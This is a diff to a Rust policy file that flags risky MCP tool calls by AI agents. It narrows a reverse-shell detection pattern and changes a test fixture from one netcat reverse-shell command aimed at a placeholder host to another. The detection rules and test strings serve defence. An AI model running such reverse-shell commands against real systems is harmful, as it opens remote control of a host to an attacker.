@@ -37,7 +37,8 @@ struct CompiledMcpRule {
     severity: McpSeverity,
 }
 
-/// All MCP tool policy rules
+/// All MCP tool policy rules. `nc -e`/`ncat -e` prüft nur noch `shell_command`,
+/// das ihn auch im serialisierten Tool-Call per Policy entscheidet.
 static MCP_RULES: &[McpPolicyRuleDef] = &[
     // ── Destruktive Dateioperationen ─────────────────────────────────────────
     McpPolicyRuleDef {
@@ -75,7 +76,7 @@ static MCP_RULES: &[McpPolicyRuleDef] = &[
     McpPolicyRuleDef {
         name: "pi_mcp_reverse_shell",
         tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
-        arg_pattern: r"(?i)(bash\s+-i\s+>&|/dev/tcp/|mkfifo\s+|nc\s+-e|ncat\s+-e)",
+        arg_pattern: r"(?i)(bash\s+-i\s+>&|/dev/tcp/|mkfifo\s+)",
         severity: McpSeverity::Critical,
     },
     // ── Package Installation ─────────────────────────────────────────────────
@@ -411,7 +412,7 @@ mod tests {
             (
                 "pi_mcp_reverse_shell",
                 "bash",
-                "nc -e /bin/sh example.test 4242",
+                "mkfifo /tmp/f; nc example.test 4242 < /tmp/f",
             ),
             ("pi_mcp_pkg_install", "bash", "pip install example"),
             ("pi_mcp_git_destructive", "git", "reset --hard"),
